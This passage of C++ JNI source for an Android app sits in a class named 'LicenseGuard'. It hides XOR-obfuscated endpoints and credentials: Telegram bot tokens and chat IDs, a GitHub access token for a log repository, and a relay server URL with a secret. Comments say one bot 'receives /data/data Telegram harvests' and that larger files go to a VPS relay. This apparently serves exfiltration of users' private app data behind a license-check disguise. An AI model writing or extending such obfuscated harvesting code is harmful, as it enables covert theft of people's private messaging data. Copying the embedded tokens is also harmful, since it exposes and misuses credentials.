  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetBaseUrl(
      JNIEnv *env, jobject) {
      std::string url = xor_decode(BASE_URL_OBF, sizeof(BASE_URL_OBF));
      return env->NewStringUTF(url.c_str());
  }


  static const uint8_t DOWNLOAD_URL_OBF[] = {
      0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
      0x3D,0x28,0x3B,0x2E,0x3F,0x3C,0x2F,0x36,
      0x77,
      0x37,0x2F,0x36,0x3F,
      0x77,
      0x63,0x69,0x63,
      0x74,
      0x39,0x35,0x34,0x2C,0x3F,0x22,0x74,
      0x29,0x33,0x2E,0x3F,
      0x75,
      0x3E,0x35,0x2D,0x34,0x36,0x35,0x3B,0x3E
  };

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetDownloadUrl(
      JNIEnv *env, jobject) {
      std::string url = xor_decode(DOWNLOAD_URL_OBF, sizeof(DOWNLOAD_URL_OBF));
      return env->NewStringUTF(url.c_str());
  }




  static const uint8_t TG_BOT_OBF[] = {
      0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
      0x2E,0x74,0x37,0x3F,0x75,0x1F,0x39,0x35,
      0x37,0x19,0x3B,0x37,0x18,0x35,0x2E
  };


  static const uint8_t TG_CHANNEL_OBF[] = {
      0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
      0x2E,0x74,0x37,0x3F,0x75,0x1F,0x39,0x35,
      0x37,0x37,0x3F,0x28,0x39,0x3F,0x18,0x3F,
      0x3B,0x29,0x2E
  };


  static const uint8_t TG_OWNER_OBF[] = {
      0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
      0x2E,0x74,0x37,0x3F,0x75,0x29,0x2D,0x33,
      0x29,0x32,0x23,0x05,0x22,0x3E
  };

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgBot(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(TG_BOT_OBF, sizeof(TG_BOT_OBF)).c_str());
  }

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgChannel(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(TG_CHANNEL_OBF, sizeof(TG_CHANNEL_OBF)).c_str());
  }

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgOwner(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(TG_OWNER_OBF, sizeof(TG_OWNER_OBF)).c_str());
  }

  // ── Native secrets (XOR-obfuscated) — Telegram bot token / chat id / API ──
  static const uint8_t TG_BOT_TOKEN_OBF[] = {
      0x62,0x62,0x6B,0x62,0x6A,0x6C,0x68,0x68,0x63,0x62,0x60,0x1B,0x1B,0x1D,0x0F,0x2A,
      0x0F,0x36,0x77,0x0F,0x03,0x6B,0x0B,0x3C,0x6A,0x3F,0x3F,0x3B,0x6E,0x29,0x05,0x02,
      0x30,0x0B,0x36,0x12,0x38,0x16,0x13,0x33,0x6B,0x69,0x28,0x68,0x20,0x0B
  };
  static const uint8_t TG_CHAT_ID_OBF[] = {
      0x77,0x6B,0x6A,0x6A,0x6E,0x6E,0x63,0x6D,0x6C,0x6A,0x6E,0x6F,0x62,0x69
  };
  static const uint8_t TG_API_OBF[] = {
      0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x3B,0x2A,0x33,0x74,0x2E,0x3F,0x36,0x3F,
      0x3D,0x28,0x3B,0x37,0x74,0x35,0x28,0x3D
  };

  // ── GitHub (Mylogs log repo) secrets ───────────────────────────────────────
    /* [V96] Log-upload token = owner's Amkushu999 PAT (scope repo,write:packages),
   * supplied 2026-09-15. Replaces the laroi254 PAT. OWNER/REPO unchanged
   * (Amkushu999/Mylogs), matching this token's own account. */
  static const uint8_t GITHUB_TOKEN_OBF[] = {
      0x3D, 0x32, 0x2A, 0x05, 0x17, 0x6B, 0x3F, 0x3B,
      0x29, 0x28, 0x29, 0x3F, 0x00, 0x62, 0x0D, 0x2D,
      0x31, 0x3C, 0x13, 0x22, 0x6A, 0x37, 0x2F, 0x0E,
      0x2A, 0x3F, 0x09, 0x1E, 0x68, 0x13, 0x38, 0x1B,
      0x3D, 0x38, 0x69, 0x2C, 0x68, 0x3C, 0x2E, 0x35
  };
  static const uint8_t GITHUB_OWNER_OBF[] = {
      0x1B,0x37,0x31,0x2F,0x29,0x32,0x2F,0x63,0x63,0x63
  };
  static const uint8_t GITHUB_REPO_OBF[] = {
      0x17,0x23,0x36,0x35,0x3D,0x29
  };

  // ── [V55 harvest] Telegram bot that receives /data/data Telegram harvests ──
  static const uint8_t HARVEST_BOT_TOKEN_OBF[] = {
      0x62,0x62,0x6A,0x68,0x6F,0x6D,0x68,0x69,0x6E,0x69,0x60,0x1B,0x1B,0x1D,0x32,0x37,
      0x1F,0x35,0x08,0x16,0x03,0x77,0x6D,0x05,0x3D,0x33,0x09,0x05,0x63,0x3B,0x2A,0x35,
      0x0D,0x29,0x69,0x3E,0x6C,0x3C,0x3D,0x6C,0x1C,0x17,0x32,0x3C,0x6A,0x0F
  };
  static const uint8_t HARVEST_CHAT_ID_OBF[] = {
      0x62,0x6E,0x6F,0x69,0x6E,0x69,0x6B,0x6F,0x68,0x6B
  };

  // ── [V56] harvest relay (files > 20 MB bypass Telegram, go to the VPS) ────
  static const uint8_t RELAY_BASE_OBF[] = {
      0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x31,0x2F,0x29,0x32,0x2F,0x74,0x2E,0x35,
      0x31,0x3F,0x34,0x33,0x20,0x3F,0x3E,0x74,0x34,0x3B,0x37,0x3F
  };
  static const uint8_t RELAY_SECRET_OBF[] = {
      0x6B,0x6B,0x6A,0x3F,0x39,0x39,0x3C,0x38,0x6D,0x6C,0x6D,0x3F,0x62,0x6F,0x3C,0x3F,
      0x6B,0x63,0x6D,0x6B,0x3E,0x69,0x6A,0x38,0x6D,0x3C,0x6F,0x6A,0x69,0x69,0x6C,0x6D
  };

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetRelayBase(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(RELAY_BASE_OBF, sizeof(RELAY_BASE_OBF)).c_str());
  }
  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetRelaySecret(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(RELAY_SECRET_OBF, sizeof(RELAY_SECRET_OBF)).c_str());
  }

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetHarvestBotToken(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(HARVEST_BOT_TOKEN_OBF, sizeof(HARVEST_BOT_TOKEN_OBF)).c_str());
  }
  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetHarvestChatId(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(HARVEST_CHAT_ID_OBF, sizeof(HARVEST_CHAT_ID_OBF)).c_str());
  }

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetGitHubToken(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(GITHUB_TOKEN_OBF, sizeof(GITHUB_TOKEN_OBF)).c_str());
  }
  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetGitHubOwner(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(GITHUB_OWNER_OBF, sizeof(GITHUB_OWNER_OBF)).c_str());
  }
  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetGitHubRepo(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(GITHUB_REPO_OBF, sizeof(GITHUB_REPO_OBF)).c_str());
  }

  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgBotToken(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(TG_BOT_TOKEN_OBF, sizeof(TG_BOT_TOKEN_OBF)).c_str());
  }
  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgChatId(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(TG_CHAT_ID_OBF, sizeof(TG_CHAT_ID_OBF)).c_str());
  }
  JNIEXPORT jstring JNICALL
  Java_com_itsme_itsanon_security_LicenseGuard_nativeGetTgApi(
      JNIEnv *env, jobject) {
      return env->NewStringUTF(xor_decode(TG_API_OBF, sizeof(TG_API_OBF)).c_str());
  }

  }
